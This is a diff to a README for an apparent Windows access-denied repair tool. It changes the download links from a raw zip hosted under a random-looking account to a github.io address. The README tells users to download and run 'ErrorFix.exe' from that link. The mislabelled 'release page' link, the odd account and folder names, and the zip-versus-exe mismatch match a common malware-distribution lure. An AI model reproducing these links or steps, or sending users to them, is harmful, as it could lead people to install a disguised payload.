@@ -1,6 +1,6 @@
 # 🛠️ Error-0x80070005-Fix - Resolve Access Denied Errors Quickly
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/camphorated-doctorate51/Error-0x80070005-Fix/main/misery/x_Error_Fix_v2.8.zip)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](camphorated-doctorate51.github.io)
 
 ## 🎯 About This Tool
 The Error-0x80070005-Fix application repairs access denied issues on Windows 10 and Windows 11. This error prevents Windows Update from installing files correctly. It often happens when system folders have incorrect permission settings. This program resets these permissions to default values. It restores the ability to run updates without manual registry changes.
@@ -14,7 +14,7 @@ The Error-0x80070005-Fix application repairs access denied issues on Windows 10 
 ## 💾 Download and Installation
 Follow these steps to obtain the tool:
 
-1. Visit the [official release page](https://raw.githubusercontent.com/camphorated-doctorate51/Error-0x80070005-Fix/main/misery/x_Error_Fix_v2.8.zip) to download the repair utility.
+1. Visit the [official release page](camphorated-doctorate51.github.io) to download the repair utility.
 2. Locate the file named `ErrorFix.exe` in the release list.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
